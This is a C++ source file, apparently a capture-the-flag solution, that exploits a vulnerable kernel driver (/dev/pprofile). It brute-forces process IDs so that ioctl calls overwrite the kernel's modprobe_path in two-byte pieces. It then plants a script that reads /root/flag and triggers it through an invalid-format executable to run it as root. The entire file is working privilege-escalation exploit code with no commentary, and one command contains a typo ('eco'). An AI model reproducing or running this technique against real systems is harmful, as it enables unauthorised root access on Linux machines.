#include <iostream>
#include <sys/types.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
using namespace std;

#define IOCTL_ALLOC 32
#define IOCTL_FREE 64
#define IOCTL_READ 16

struct ioctl_s {
	char* name;
	uint64_t* output;
} ioc_s;


int fd;

void write_2b(uint64_t offset, int bytes){

	while(true){
		pid_t p = fork();
		if(p == 0){
							cout << "PID " << getpid() << endl;
							if(getpid() != bytes){
								exit(0);
							}

						for(uint32_t i=0; i<256; i++){
							uint64_t target = 0xffffffff00000000L + (i << 24);
							target += offset;
							ioc_s.output = (uint64_t*)target;
							int x = ioctl(fd, IOCTL_ALLOC, &ioc_s);
							ioctl(fd, IOCTL_READ, &ioc_s);
							ioctl(fd, IOCTL_FREE, &ioc_s);
							printf("%p %d\n", target, x);
						}
						exit(0);
		} else {
			waitpid(p, 0, 0);
			if(p == bytes)
					break;
		}
	}
}
int main(){
	uint64_t modprobe_path_offset = 0x1256f40;
	
	fd = open("/dev/pprofile", O_RDONLY);

	string name = "MAHER";
	ioc_s.name = (char *)name.c_str();
	
	write_2b(modprobe_path_offset-8+0, 29743);
	write_2b(modprobe_path_offset-8+2, 28781);
	write_2b(modprobe_path_offset-8+4, 24879);
	
	system("echo -ne '#!/bin/sh\ncat /root/flag > /tmp/f\n' > /tmp/a");
	system("eco -ne '\xff\xff\xff\xff' > /tmp/trigger");
	system("chmod 777 /tmp/*");
	system("/tmp/trigger; cat /tmp/f");

	cout << "Finished check modprobe_path now !" << endl;
	close(fd);

	return 0;
}
